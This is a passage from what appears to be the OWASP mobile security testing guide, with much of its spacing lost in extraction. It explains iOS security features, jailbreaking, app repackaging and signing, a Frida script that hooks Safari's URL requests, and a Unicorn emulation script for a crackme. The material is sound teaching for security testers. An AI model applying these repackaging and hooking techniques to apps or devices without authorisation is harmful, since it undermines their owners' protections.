enable data protection, the passcode must be used when accessing the device. Thepasscodeunlocksthedevice. CombinedwiththeUID,thepasscodealsocreatesiOSencryptionkeysthataremore resistanttohackingandbrute-forceattacks. Enablingdataprotectionisthemainreasonforuserstousepasscodeson theirdevices. Sandbox TheappsandboxisaniOSaccesscontroltechnology. Itisenforcedatthekernellevel. Itspurposeislimitingsystemand userdatadamagethatmayoccurwhenanappiscompromised. SandboxinghasbeenacoresecurityfeaturesincethefirstreleaseofiOS.Allthird-partyappsrununderthesameuser (mobile),andonlyafewsystemapplicationsandservicesrunasroot(orotherspecificsystemusers). RegulariOSapps areconfinedtoacontainerthatrestrictsaccesstotheapp’sownfilesandaverylimitednumberofsystemAPIs. Accessto allresources(suchasfiles,networksockets,IPCs,andsharedmemory)arecontrolledbythesandbox. Theserestrictions workasfollows[#levin]: • The app process is restricted to its own directory (under /var/mobile/Containers/ Bundle/Application/ or /var/containers/Bundle/Application/,dependingontheiOSversion)viaachroot-likeprocess. • Themmapandmmprotectsystemcallsaremodifiedtopreventappsfrommakingwritablememorypagesexecutable andstoppingprocessesfromexecutingdynamicallygeneratedcode. IncombinationwithcodesigningandFairPlay, this strictly limits what code can run under specific circumstances (e.g., all code in apps distributed via the App StoreisapprovedbyApple). • Processesareisolatedfromeachother,eveniftheyareownedbythesameUIDattheoperatingsystemlevel. • Hardwaredriverscan’tbeaccesseddirectly. Instead,theymustbeaccessedthroughApple’spublicframeworks. General Exploit Mitigations iOS implements address space layout randomization (ASLR) and eXecute Never (XN) bit to mitigate code execution at- tacks. ASLRrandomizesthememorylocationoftheprogram’sexecutablefile, data, heap, andstackeverytimetheprogram isexecuted. Becausethesharedlibrariesmustbestatictobeaccessedbymultipleprocesses,theaddressesofshared libraries are randomized every time the OS boots instead of every time the program is invoked. This makes specific function and library memory addresses hard to predict, thereby preventing attacks such as the return-to-libc attack, whichinvolvesthememoryaddressesofbasiclibcfunctions. TheXNmechanismallowsiOStomarkselectedmemorysegmentsofaprocessasnon-executable. OniOS,theprocess stackandheapofuser-modeprocessesismarkednon-executable. Pagesthatarewritablecannotbemarkedexecutable atthesametime. Thispreventsattackerstoexecutemachinecodeinjectedintothestackorheap. 330\nSoftware Development on iOS Like other platforms, Apple provides a Software Development Kit (SDK) that helps developers to develop, install, run, andtestnativeiOSApps. XcodeisanIntegratedDevelopmentEnvironment(IDE)forApplesoftwaredevelopment. iOS applicationsaredevelopedinObjective-CorSwift. Objective-C is an object-oriented programming language that adds Smalltalk-style messaging to the C programming language. ItisusedonmacOStodevelopdesktopapplicationsandoniOStodevelopmobileapplications. Swiftisthe successorofObjective-CandallowsinteroperabilitywithObjective-C. SwiftwasintroducedwithXcode6in2014. Onanon-jailbrokendevice,therearetwowaystoinstallanapplicationoutoftheAppStore: 1. viaEnterpriseMobileDeviceManagement. Thisrequiresacompany-widecertificatesignedbyApple. 2. viasideloading, i.e., bysigninganappwithadeveloper’scertificateandinstallingitonthedeviceviaXcode(or CydiaImpactor). Alimitednumberofdevicescanbeinstalledtowiththesamecertificate. Apps on iOS iOSappsaredistributedinIPA(iOSAppStorePackage)archives. TheIPAfileisaZIP-compressedarchivethatcontains allthecodeandresourcesrequiredtoexecutetheapp. IPAfileshaveabuilt-indirectorystructure. Theexamplebelowshowsthisstructureatahighlevel: • /Payload/foldercontainsalltheapplicationdata. Wewillcomebacktothecontentsofthisfolderinmoredetail. • /Payload/Application.app contains the application data itself (ARM-compiled code) and associated static re- sources. • /iTunesArtworkisa512x512pixelPNGimageusedastheapplication’sicon. • /iTunesMetadata.plistcontainsvariousbitsofinformation,includingthedeveloper’snameandID,thebundle identifier,copyrightinformation,genre,thenameoftheapp,releasedate,purchasedate,etc. • /WatchKitSupport/WKisanexampleofanextensionbundle. Thisspecificbundlecontainstheextensiondelegate andthecontrollersformanagingtheinterfacesandrespondingtouserinteractionsonanAppleWatch. IPA Payloads - A Closer Look Let’stakeacloserlookatthedifferentfilesintheIPAcontainer. Appleusesarelativelyflatstructurewithfewextraneous directoriestosavediskspaceandsimplifyfileaccess. Thetop-levelbundledirectorycontainstheapplication’sexecutable fileandalltheresourcestheapplicationuses(forexample,theapplicationicon,otherimages,andlocalizedcontent. • MyApp: Theexecutablefilecontainingthecompiled(unreadable)applicationsourcecode. • Application: Applicationicons. • Info.plist: Configurationinformation,suchasbundleID,versionnumber,andapplicationdisplayname. • Launchimages: Imagesshowingtheinitialapplicationinterfaceinaspecificorientation. Thesystemusesoneof theprovidedlaunchimagesasatemporarybackgrounduntiltheapplicationisfullyloaded. • MainWindow.nib: Default interface objects that are loaded when the application is launched. Other interface objectsaretheneitherloadedfromothernibfilesorcreatedprogrammaticallybytheapplication. • Settings.bundle: Application-specificpreferencestobedisplayedintheSettingsapp. • Customresourcefiles: Non-localizedresourcesareplacedinthetop-leveldirectoryandlocalizedresourcesare placed in language-specific subdirectories of the application bundle. Resources include nib files, images, sound files,configurationfiles,stringsfiles,andanyothercustomdatafilestheapplicationuses. Alanguage.lprojfolderexistsforeachlanguagethattheapplicationsupports. Itcontainsastoryboardandstringsfile. • AstoryboardisavisualrepresentationoftheiOSapplication’suserinterface. Itshowsscreensandtheconnections betweenthosescreens. • Thestringsfileformatconsistsofoneormorekey-valuepairsandoptionalcomments. 331\nOn a jailbroken device, you can recover the IPA for an installed iOS app using different tools that allow decrypting the mainappbinaryandreconstructtheIPAfile. Similarly,onajailbrokendeviceyoucaninstalltheIPAfilewithIPAInstaller. During mobile security assessments, developers often give you the IPA directly. They can send you the actual file or provideaccesstothedevelopment-specificdistributionplatformtheyuse,e.g.TestFlightorVisualStudioAppCenter. App Permissions IncontrasttoAndroidapps(beforeAndroid6.0(APIlevel23)), iOSappsdon’thavepre-assignedpermissions. Instead, theuserisaskedtograntpermissionduringruntime,whentheappattemptstouseasensitiveAPIforthefirsttime. Apps thathavebeengrantedpermissionsarelistedintheSettings>Privacymenu,allowingtheusertomodifytheapp-specific setting. Applecallsthispermissionconceptprivacycontrols. iOSdeveloperscan’tsetrequestedpermissionsdirectly,thesewillberequestedindirectlywhenaccessingsensitiveAPIs. Forexample,whenaccessingauser’scontacts,anycalltoCNContactStoreblockstheappwhiletheuserisbeingasked tograntordenyaccess. StartingwithiOS10.0,appsmustincludeusagedescriptionkeysforthetypesofpermissions theyrequestanddatatheyneedtoaccess(e.g.,NSContactsUsageDescription). ThefollowingAPIsrequireuserpermission: • Contacts • Microphone • Calendars • Camera • Reminders • HomeKit • Photos • Health • Motionactivityandfitness • Speechrecognition • LocationServices • Bluetoothsharing • MediaLibrary • Socialmediaaccounts DeviceCheck The DeviceCheck framework, including its components DeviceCheck and App Attest, helps you prevent fraudulent use of your services. It consists of a framework that you use from your app and an Apple server which is accessible only toyourownserver. DeviceCheckallowsyoutopersistentlystoreinformationonthedeviceandonAppleservers. The storedinformationremainsintactacrossappreinstallation,devicetransfers,orresets,withtheoptiontoresetthisdata periodically. DeviceCheckistypicallyusedtomitigatefraudbyrestrictingaccesstosensitiveresources. Forexample,limitingpromo- tions to once per device, identify and flag fraudulent devices, etc. However, it definitely cannot prevent all fraud. For example,itisnotmeanttodetectcompromisedoperatingsystems(aka. jailbreakdetection). 332\nFormoreinformation,refertotheDeviceCheckdocumentation. App Attest App Attest, available under the DeviceCheck framework, helps you verify instances of the app running on a device by enablingappstoattachahardware-backedassertiontorequests,ensuringtheyoriginatefromthelegitimateappona genuineAppledevice. Thisfeatureaidsinpreventingmodifiedappsfromcommunicatingwithyourserver. Theprocessinvolvesgeneratingandvalidatingcryptographickeys, alongwithasetofverificationsperformedbyyour server,ensuringtheauthenticityoftherequest. ItisimportanttonotethatwhileAppAttestenhancessecurity,itdoes notguaranteecompleteprotectionagainstallformsoffraudulentactivities. Formoredetailedinformation,refertotheWWDC2021session,alongwiththeAppAttestdocumentationandAppAttest implementationguide. 333\niOS Security Testing Inthischapter,we’lldiveintosettingupasecuritytestingenvironmentandintroduceyoutosomepracticalprocesses andtechniquesfortestingthesecurityofiOSapps. ThesearethebuildingblocksfortheMASTGtestcases. iOS Testing Setup AlthoughyoucanuseaLinuxorWindowshostcomputerfortesting,you’llfindthatmanytasksaredifficultorimpossible ontheseplatforms. Inaddition,theXcodedevelopmentenvironmentandtheiOSSDKareonlyavailableformacOS.This means that you’ll definitely want to work on macOS for source code analysis and debugging (it also makes black box testingeasier). Host Device ThefollowingisthemostbasiciOSapptestingsetup: • IdeallymacOShostcomputerwithadminrights • XcodeandXcodeCommandLineToolsinstalled. • Wi-Finetworkthatpermitsclient-to-clienttraffic. • AtleastonejailbrokeniOSdevice(ofthedesirediOSversion). • BurpSuiteorotherinterceptionproxytool. Obtaining the UDID of an iOS device TheUDIDisa40-digituniquesequenceoflettersandnumberstoidentifyaniOSdevice. YoucanfindtheUDIDofyour iOSdeviceonmacOSCatalinaonwardsintheFinderapp,asiTunesisnotavailableanymoreinCatalina. OpenFinderand selecttheconnectediOSdeviceinthesidebar. Clickonthetextcontainingthemodel, storagecapacity, andbatteryinformation, anditwilldisplaytheserialnumber, UDID,andmodelinstead: 334\nYoucancopytheUDIDbyrightclickingonit. ItisalsopossibletogettheUDIDviavariouscommandlinetoolsonmacOSwhilethedeviceisattachedviaUSB: • ByusingtheI/ORegistryExplorertoolioreg: $ioreg -pIOUSB -l|grep "USBSerial" | "USBSerial Number" ="9e8ada44246cee813e2f8c1407520bf2f84849ec" • Byusingideviceinstaller(alsoavailableonLinux): $brew installideviceinstaller $idevice_id -l 316f01bd160932d2bf2f95f1f142bc29b1c62dbc • Byusingthesystem_profiler: $system_profiler SPUSBDataType |sed-n-e'/iPad/,/Serial/p;/iPhone/,/Serial/p;/iPod/,/Serial/p' |grep "SerialNumber:" 2019-09-0810:18:03.920 system_profiler[13251:1050356]SPUSBDevice:IOCreatePlugInInterfaceForServicefailed0xe00002be SerialNumber: 64655621de6ef5e56a874d63f1e1bdd14f7103b1 • Byusinginstruments: instruments -sdevices Testing on a real device (Jailbroken) You should have a jailbroken iPhone or iPad for running tests. These devices allow root access and tool installation, makingthesecuritytestingprocessmorestraightforward. Ifyoudon’thaveaccesstoajailbrokendevice,youcanapply theworkaroundsdescribedlaterinthischapter,butbepreparedforamoredifficultexperience. Testing on the iOS Simulator UnliketheAndroidemulator,whichfullyemulatesthehardwareofanactualAndroiddevice,theiOSSDKsimulatoroffers a higher-level simulation of an iOS device. Most importantly, emulator binaries are compiled to x86 code instead of ARM code. Apps compiled for a real device don’t run, making the simulator useless for black box analysis and reverse engineering. 335\nTesting on an Emulator CorelliumistheonlypubliclyavailableiOSemulator. ItisanenterpriseSaaSsolutionwithaperuserlicensemodeland doesnotoffercommunitylicenses. Getting Privileged Access iOSjailbreakingisoftencomparedtoAndroidrooting,buttheprocessisactuallyquitedifferent. Toexplainthedifference, we’llfirstreviewtheconceptsof“rooting”and“flashing”onAndroid. • Rooting: Thistypicallyinvolvesinstallingthesubinaryonthesystemorreplacingthewholesystemwitharooted customROM.Exploitsaren’trequiredtoobtainrootaccessaslongasthebootloaderisaccessible. • Flashing custom ROMs: This allows you to replace the OS that’s running on the device after you unlock the bootloader. Thebootloadermayrequireanexploittounlockit. OniOSdevices,flashingacustomROMisimpossiblebecausetheiOSbootloaderonlyallowsApple-signedimagestobe bootedandflashed. ThisiswhyevenofficialiOSimagescan’tbeinstallediftheyaren’tsignedbyApple,anditmakes iOSdowngradesonlypossibleforaslongasthepreviousiOSversionisstillsigned. ThepurposeofjailbreakingistodisableiOSprotections(Apple’scodesigningmechanismsinparticular)sothatarbitrary unsignedcodecanrunonthedevice(e.g.customcodeordownloadedfromalternativeappstoressuchasCydiaorSileo). Theword“jailbreak”isacolloquialreferencetoall-in-onetoolsthatautomatethedisablingprocess. DevelopingajailbreakforagivenversionofiOSisnoteasy. Asasecuritytester,you’llmostlikelywanttousepublicly availablejailbreaktools. Still,werecommendstudyingthetechniquesthathavebeenusedtojailbreakvariousversions of iOS-you’ll encounter many interesting exploits and learn a lot about OS internals. For example, Pangu9 for iOS 9.x exploitedatleastfivevulnerabilities,includingause-after-freekernelbug(CVE-2015-6794)andanarbitraryfilesystem accessvulnerabilityinthePhotosapp(CVE-2015-7037). SomeappsattempttodetectwhethertheiOSdeviceonwhichthey’rerunningisjailbroken. Thisisbecausejailbreaking deactivatessomeofiOS’defaultsecuritymechanisms. However,thereareseveralwaystogetaroundthesedetections, andwe’llintroducetheminthechapter“iOSAnti-ReversingDefenses”. Benefits of Jailbreaking EndusersoftenjailbreaktheirdevicestotweaktheiOSsystem’sappearance,addnewfeatures,andinstallthird-party appsfromunofficialappstores. Forasecuritytester,however,jailbreakinganiOSdevicehasevenmorebenefits. They include,butaren’tlimitedto,thefollowing: • Rootaccesstothefilesystem. • Possibilityofexecutingapplicationsthathaven’tbeensignedbyApple(whichincludesmanysecuritytools). • Unrestricteddebugginganddynamicanalysis. • AccesstotheObjective-CorSwiftruntime. Jailbreak Types Therearetethered,semi-tethered,semi-untethered,anduntetheredjailbreaks. • Tethered jailbreaks don’t persist through reboots, so re-applying jailbreaks requires the device to be connected (tethered)toacomputerduringeveryreboot. Thedevicemaynotrebootatallifthecomputerisnotconnected. • Semi-tetheredjailbreakscan’tbere-appliedunlessthedeviceisconnectedtoacomputerduringreboot. Thedevice canalsobootintonon-jailbrokenmodeonitsown. • Semi-untetheredjailbreaksallowthedevicetobootonitsown,butthekernelpatches(oruser-landmodifications) fordisablingcodesigningaren’tappliedautomatically. Theusermustre-jailbreakthedevicebystartinganappor visitingawebsite(notrequiringaconnectiontoacomputer,hencethetermuntethered). • Untetheredjailbreaksarethemostpopularchoiceforendusersbecausetheyneedtobeappliedonlyonce,after whichthedevicewillbepermanentlyjailbroken. 336\nCaveats and Considerations DevelopingajailbreakforiOSisbecomingmoreandmorecomplicatedasApplecontinuestohardentheirOS.Whenever Applebecomesawareofavulnerability,itispatchedandasystemupdateispushedouttoallusers. Asitisnotpossible to downgrade to a specific version of iOS, and since Apple only allows you to update to the latest iOS version, it is a challengetohaveadevicewhichisrunningaversionofiOSforwhichajailbreakisavailable. Somevulnerabilitiescannot bepatchedbysoftware,suchasthecheckm8exploitaffectingtheBootROMofallCPUsuntilA12. If you have a jailbroken device that you use for security testing, keep it as is unless you’re 100% sure that you can re- jailbreak it after upgrading to the latest iOS version. Consider getting one (or multiple) spare device(s) (which will be updatedwitheverymajoriOSrelease)andwaitingforajailbreaktobereleasedpublicly. Appleisusuallyquicktorelease apatchonceajailbreakhasbeenreleasedpublicly,soyouonlyhaveacoupleofdaystodowngrade(ifitisstillsigned byApple)totheaffectediOSversionandapplythejailbreak. iOSupgradesarebasedonachallenge-responseprocess(generatingtheso-calledSHSHblobsasaresult). Thedevice will allow the OS installation only if the response to the challenge is signed by Apple. This is what researchers call a “signingwindow”,anditisthereasonyoucan’tsimplystoretheOTAfirmwarepackageyoudownloadedandloaditonto thedevicewheneveryouwantto. DuringminoriOSupgrades,twoversionsmaybothbesignedbyApple(thelatestone, andthepreviousiOSversion). ThisistheonlysituationinwhichyoucandowngradetheiOSdevice. Youcancheckthe currentsigningwindowanddownloadOTAfirmwarefromtheIPSWDownloadswebsite. ForsomedevicesandiOSversions,itispossibletodowngradetoolderversionsincasetheSHSHblobsforthatdevice werecollectedwhenthesigningwindowwasactive. MoreinformationonthiscanbefoundonthecfwiOSGuide-Saving Blobs Which Jailbreaking Tool to Use DifferentiOSversionsrequiredifferentjailbreakingtechniques. Determinewhetherapublicjailbreakisavailableforyour version of iOS. Beware of fake tools and spyware, which are often hiding behind domain names that are similar to the nameofthejailbreakinggroup/author. TheiOSjailbreaksceneevolvessorapidlythatprovidingup-to-dateinstructionsisdifficult. However,wecanpointyou tosomesourcesthatarecurrentlyreliable. • AppleDB • TheiPhoneWiki • RedmondPie • RedditJailbreak Notethatanymodificationyoumaketoyourdeviceisatyourownrisk. Whilejailbreakingistypicallysafe,things cangowrongandyoumayendupbrickingyourdevice. Nootherpartyexceptyourselfcanbeheldaccountablefor anydamage. Dynamic Analysis on Non-Jailbroken Devices Platform: ios Ifyoudon’thaveaccesstoajailbrokendevice,youcanpatchandrepackagethetargetapptoloadadynamiclibraryat startup (e.g. the Frida gadget to enable dynamic testing with Frida and related tools such as objection). This way, you can instrument the app and do everything you need to do for dynamic analysis (of course, you can’t break out of the sandboxthisway). However,thistechniqueonlyworksiftheappbinaryisn’tFairPlay-encrypted(i.e.,obtainedfromthe AppStore). Automated Repackaging Objectionautomatestheprocessofapprepackaging. Youcanfindexhaustivedocumentationontheofficialwikipages. Usingobjection’srepackagingfeatureissufficientformostofusecases. However,insomecomplexscenariosyoumight need more fine-grained control or a more customizable repackaging process. In that case, you can read a detailed explanationoftherepackagingandresigningprocessin“ManualRepackaging”. 337\nManual Repackaging ThankstoApple’sconfusingprovisioningandcode-signingsystem,re-signinganappismorechallengingthanyouwould expect. iOSwon’trunanappunlessyougettheprovisioningprofileandcodesignatureheaderexactlyright. Thisrequires learningmanyconcepts-certificatetypes,BundleIDs,applicationIDs,teamidentifiers,andhowApple’sbuildtoolsconnect them. GettingtheOStorunabinarythathasn’tbeenbuiltviathedefaultmethod(Xcode)canbeadauntingprocess. We’lluseoptool,Apple’sbuildtools,andsomeshellcommands. OurmethodisinspiredbyVincentTan’sSwizzlerproject. TheNCCgrouphasdescribedanalternativerepackagingmethod. Toreproducethestepslistedbelow,downloadUnCrackableiOSAppLevel1fromtheOWASPMobileTestingGuiderepos- itory. Our goal is to make the UnCrackable app load FridaGadget.dylib during startup so we can instrument the app withFrida. PleasenotethatthefollowingstepsapplytomacOSonly,asXcodeisonlyavailableformacOS. Getting a Developer Provisioning Profile and Certificate TheprovisioningprofileisaplistfilesignedbyApple,whichaddsyourcode-signingcertificatetoitslistofacceptedcertifi- catesononeormoredevices. Inotherwords,thisrepresentsAppleexplicitlyallowingyourapptorunforcertainreasons, such as debugging on selected devices (development profile). The provisioning profile also includes the entitlements grantedtoyourapp. Thecertificatecontainstheprivatekeyyou’llusetosign. Dependingonwhetheryou’reregisteredasaniOSdeveloper,youcanobtainacertificateandprovisioningprofileinone ofthefollowingways: WithaniOSdeveloperaccount: Ifyou’vedevelopedanddeployediOSappswithXcodebefore,youalreadyhaveyourowncode-signingcertificateinstalled. Usethesecuritycommand(macOSonly)tolistyoursigningidentities: $securityfind-identity -v 1)61FA3547E0AF42A11E233F6A2B255E6B6AF262CE "iPhoneDistribution:CompanyNameLtd." 2)8004380F331DCA22CC1B47FB1A805890AE41C938 "iPhoneDeveloper:BernhardMüller(RV852WND79)" LogintotheAppleDeveloperportaltoissueanewAppID,thenissueanddownloadtheprofile. AnAppIDisatwo-part string: aTeamIDsuppliedbyAppleandabundleIDsearchstringthatyoucansettoanarbitraryvalue, suchascom. example.myapp. Note that you can use a single App ID to re-sign multiple apps. Make sure you create adevelopment profileandnotadistributionprofilesothatyoucandebugtheapp. Intheexamplesbelow,Iusemysigningidentity,whichisassociatedwithmycompany’sdevelopmentteam. Icreated theAppID“sg.vp.repackaged”andtheprovisioningprofile“AwesomeRepackaging”fortheseexamples. Iendedupwith thefileAwesomeRepackaging.mobileprovision-replacethiswithyourownfilenameintheshellcommandsbelow. WithaRegularAppleID: Applewillissueafreedevelopmentprovisioningprofileevenifyou’renotapayingdeveloper. Youcanobtaintheprofile viaXcodeandyourregularAppleaccount: simplycreateanemptyiOSprojectandextractembedded.mobileprovision from the app container, which is in the Xcode subdirectory of your home directory: ~/Library/Developer/Xcode/ DerivedData/<ProjectName>/Build/Products/Debug-iphoneos/<ProjectName>.app/. TheNCCblogpost“iOSinstru- mentationwithoutjailbreak”explainsthisprocessingreatdetail. Once you’ve obtained the provisioning profile, you can check its contents with the security command. You’ll find the entitlementsgrantedtotheappintheprofile,alongwiththeallowedcertificatesanddevices. You’llneedtheseforcode- signing,soextractthemtoaseparateplistfileasshownbelow. Havealookatthefilecontentstomakesureeverything isasexpected. $securitycms -D-iAwesomeRepackaging.mobileprovision >profile.plist $/usr/libexec/PlistBuddy -x-c'Print:Entitlements' profile.plist >entitlements.plist $catentitlements.plist <?xmlversion="1.0" encoding="UTF-8"?> <!DOCTYPEplistPUBLIC "-//Apple//DTDPLIST1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0"> <dict> <key>application-identifier</key> 338\n<string>LRUD9L355Y.sg.vantagepoint.repackage</string> <key>com.apple.developer.team-identifier</key> <string>LRUD9L355Y</string> <key>get-task-allow</key> <true/> <key>keychain-access-groups</key> <array> <string>LRUD9L355Y.*</string> </array> </dict> </plist> Notetheapplicationidentifier,whichisacombinationoftheTeamID(LRUD9L355Y)andBundleID(sg.vantagepoint.repackage). ThisprovisioningprofileisonlyvalidfortheappthathasthisAppID.Theget-task-allowkeyisalsoimportant: when settotrue,otherprocesses,suchasthedebuggingserver,areallowedtoattachtotheapp(consequently,thiswould besettofalseinadistributionprofile). Method Hooking Platform: ios Frida Insection“ExecutionTracing”we’veusedfrida-tracewhennavigatingtoawebsiteinSafariandfoundthattheinitWith- URL:methodiscalledtoinitializeanewURLrequestobject. WecanlookupthedeclarationofthismethodontheApple DeveloperWebsite: -(instancetype)initWithURL:(NSURL *)url; UsingthisinformationwecanwriteaFridascriptthatinterceptstheinitWithURL:methodandprintstheURLpassedto themethod. Thefullscriptisbelow. Makesureyoureadthecodeandinlinecommentstounderstandwhat’sgoingon. importsys importfrida ##JavaScripttobeinjected frida_code =""" //ObtainareferencetotheinitWithURL:methodoftheNSURLRequestclass varURL=ObjC.classes.NSURLRequest["-initWithURL:"]; //Interceptthemethod Interceptor.attach(URL.implementation,{ onEnter:function(args){ //GetahandleonNSString varNSString=ObjC.classes.NSString; //ObtainareferencetotheNSLogfunction,anduseittoprinttheURLvalue //args[2]referstothefirstmethodargument(NSURL*url) varNSLog=newNativeFunction(Module.findExportByName('Foundation','NSLog'),'void',['pointer','...']); //WeshouldalwaysinitializeanautoreleasepoolbeforeinteractingwithObjective-CAPIs varpool=ObjC.classes.NSAutoreleasePool.alloc().init(); try{ //CreatesaJSbindinggivenaNativePointer. varmyNSURL=newObjC.Object(args[2]); //CreateanimmutableObjCstringobjectfromaJSstringobject. varstr_url=NSString.stringWithString_(myNSURL.toString()); //CalltheiOSNSLogfunctiontoprinttheURLtotheiOSdevicelogs NSLog(str_url); //UseFrida'sconsole.logtoprinttheURLtoyourterminal console.log(str_url); }finally{ pool.release(); } } }); """ 339\nprocess =frida.get_usb_device().attach("Safari") script =process.create_script(frida_code) script.load() sys.stdin.read() StartSafariontheiOSdevice. RuntheabovePythonscriptonyourconnectedhostandopenthedevicelog(asexplained inthesection“MonitoringSystemLogs”fromthechapter“iOSBasicSecurityTesting”). TryopeninganewURLinSafari, e.g.https://github.com/OWASP/owasp-mastg;youshouldseeFrida’soutputinthelogsaswellasinyourterminal. Of course, this example illustrates only one of the things you can do with Frida. To unlock the tool’s full potential, you should learn to use its JavaScript API. The documentation section of the Frida website has a tutorial and examples for usingFridaoniOS. Getting Loaded Classes and Methods dynamically Platform: ios IntheFridaREPLObjective-CruntimetheObjCcommandcanbeusedtoaccessinformationwithintherunningapp. Within theObjCcommandthefunctionenumerateLoadedClassesliststheloadedclassesforagivenapplication. $frida -U-fcom.iOweApp [iPhone::com.iOweApp]->ObjC.enumerateLoadedClasses() { "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation":[ "__NSBlockVariable__", "__NSGlobalBlock__", "__NSFinalizingBlock__", "__NSAutoBlock__", "__NSMallocBlock__", "__NSStackBlock__" ], "/private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp":[ "JailbreakDetection", "CriticalLogic", "ViewController", "AppDelegate" ] } UsingObjC.classes.<classname>.$ownMethodsthemethodsdeclaredineachclasscanbelisted. [iPhone::com.iOweApp]->ObjC.classes.JailbreakDetection.$ownMethods [ "+isJailbroken" ] [iPhone::com.iOweApp]->ObjC.classes.CriticalLogic.$ownMethods [ "+doSha256:", "-a:", "-AES128Operation:data:key:iv:", 340\n"-coreLogic", "-bat", "-b:", "-hexString:" ] Sandbox Inspection Platform: ios On iOS, each application gets a sandboxed folder to store its data. As per the iOS security model, an application’s sandboxed folder cannot be accessed by another application. Additionally, the users do not have direct access to the iOSfilesystem,thuspreventingbrowsingorextractionofdatafromthefilesystem. IniOS<8.3therewereapplications availablewhichcanbeusedtobrowsethedevice’sfilesystem,suchasiExplorerandiFunBox,butintherecentversionof iOS(>8.3)thesandboxingrulesaremorestringentandtheseapplicationsdonotworkanymore. Asaresult,ifyouneed toaccessthefilesystemitcanonlybeaccessedonajailbrokendevice. Aspartofthejailbreakingprocess,theapplication sandboxprotectionisdisabledandthusenablinganeasyaccesstosandboxedfolders. Thecontentsofanapplication’ssandboxedfolderhasalreadybeendiscussedin“AccessingAppDataDirectories”inthe chapteriOSBasicSecurityTesting. Thischaptergivesanoverviewofthefolderstructureandwhichdirectoriesyoushould analyze. Information Gathering - API Usage Platform: ios TheiOSplatformprovidesmanybuilt-inlibrariesforfrequentlyusedfunctionalitiesinapplications,forexamplecryptog- raphy,Bluetooth,NFC,networkandlocationlibraries. Determiningthepresenceoftheselibrariesinanapplicationcan giveusvaluableinformationaboutitsunderlyingworking. For instance, if an application is importing the CC_SHA256 function, it indicates that the application will be performing somekindofhashingoperationusingtheSHA256algorithm. FurtherinformationonhowtoanalyzeiOS’scryptographic APIsisdiscussedinthesection“iOSCryptographicAPIs”. Similarly,theaboveapproachcanbeusedtodeterminewhereandhowanapplicationisusingBluetooth. Forinstance,an applicationperformingcommunicationusingtheBluetoothchannelmustusefunctionsfromtheCoreBluetoothframework suchasCBCentralManagerorconnect. UsingtheiOSBluetoothdocumentationyoucandeterminethecriticalfunctions andstartanalysisaroundthosefunctionimports. Emulation-based Analysis Platform: ios iOS Simulator Apple provides a simulator app within Xcode which provides a real iOS device looking user interface for iPhone, iPad or Apple Watch. It allows you to rapidly prototype and test debug builds of your applications during the development process,butactuallyitisnotanemulator. Differencebetweenasimulatorandanemulatorispreviouslydiscussedin “Emulation-basedDynamicAnalysis”section. Whiledevelopinganddebugginganapplication,theXcodetoolchaingeneratesx86code,whichcanbeexecutedinthe iOS simulator. However, for a release build, only ARM code is generated (incompatible with the iOS simulator). That’s why applications downloaded from the Apple App Store cannot be used for any kind of application analysis on the iOS simulator. 341\nCorellium CorelliumisacommercialtoolwhichoffersvirtualiOSdevicesrunningactualiOSfirmware,beingtheonlypubliclyavail- able iOS emulator ever. Since it is a proprietary product, not much information is available about the implementation. Corelliumhasnocommunitylicensesavailable,thereforewewon’tgointomuchdetailregardingitsuse. Corellium allows you to launch multiple instances of a device (jailbroken or not) which are accessible as local devices (withasimpleVPNconfiguration). Ithastheabilitytotakeandrestoresnapshotsofthedevicestate,andalsooffersa convenientweb-basedshelltothedevice. Finallyandmostimportantly,duetoits“emulator”nature,youcanexecute applicationsdownloadedfromtheAppleAppStore,enablinganykindofapplicationanalysisasyouknowitfromrealiOS (jailbroken)devices. NotethatinordertoinstallanIPAonCorelliumdevicesithastobeunencryptedandsignedwithavalidAppledeveloper certificate. Seemoreinformationhere. Unicorn Unicornisalightweight,multi-architectureCPUemulatorframeworkbasedonQEMUandgoesbeyonditbyaddinguseful features especially made for CPU emulation. Unicorn provides the basic infrastructure needed to execute processor instructions. InthissectionwewilluseUnicorn’sPythonbindingstosolvetheUnCrackableAppforiOSLevel1challenge. TouseUnicorn’sfullpower,wewouldneedtoimplementallthenecessaryinfrastructurewhichgenerallyisreadilyavail- ablefromtheoperatingsystem,e.g.binaryloader,linkerandotherdependenciesoruseanotherhigherlevelframeworks such as Qiling which leverages Unicorn to emulate CPU instructions, but understands the OS context. However, this is superfluousforthisverylocalizedchallengewhereonlyexecutingasmallpartofthebinarywillsuffice. Whileperformingmanualanalysisin“ReviewingDisassembledNativeCode”section,wedeterminedthatthefunctionat address0x1000080d4isresponsiblefordynamicallygeneratingthesecretstring. Aswe’reabouttosee,allthenecessary codeisprettymuchself-containedinthebinary,makingthisaperfectscenariotouseaCPUemulatorlikeUnicorn. 342\nIfweanalyzethatfunctionandthesubsequentfunctioncalls,wewillobservethatthereisnoharddependencyonany externallibraryandneitherit’sperforminganysystemcalls. Theonlyaccessexternaltothefunctionsoccursforinstance ataddress0x1000080f4,whereavalueisbeingstoredtoaddress0x10000dbf0,whichmapstothe__datasection. Therefore, in order to correctly emulate this section of the code, apart from the __text section (which contains the instructions)wealsoneedtoloadthe__datasection. TosolvethechallengeusingUnicornwewillperformthefollowingsteps: • Get the ARM64 version of the binary by running lipo -thin arm64 <app_binary> -output uncrackable.arm64 (ARMv7canbeusedaswell). • Extractthe__textand__datasectionfromthebinary. • Createandmapthememorytobeusedasstackmemory. • Creatememoryandloadthe__textand__datasection. • Executethebinarybyprovidingthestartandendaddress. • Finally,dumpthereturnvaluefromthefunction,whichinthiscaseisoursecretstring. To extract the content of __text and __data section from the Mach-O binary we will useLIEF, which provides a conve- nientabstractiontomanipulatemultipleexecutablefileformats. Beforeloadingthesesectionstomemory,weneedto determinetheirbaseaddresses,e.g.byusingGhidra,Radare2orIDAPro. 343\nFromtheabovetable,wewillusethebaseaddress0x10000432cfor__textand0x10000d3e8for__datasectiontoload thematinthememory. WhileallocatingmemoryforUnicorn,thememoryaddressesshouldbe4kpagealignedandalsotheallocatedsize shouldbeamultipleof1024. Thefollowingscriptemulatesthefunctionat0x1000080d4anddumpsthesecretstring: importlief fromunicornimport * fromunicorn.arm64_constimport * ##---Extract__textand__datasectioncontentfromthebinary--- binary =lief.parse("uncrackable.arm64") text_section =binary.get_section("__text") text_content =text_section.content data_section =binary.get_section("__data") data_content =data_section.content ##---SetupUnicornforARM64execution--- arch ="arm64le" 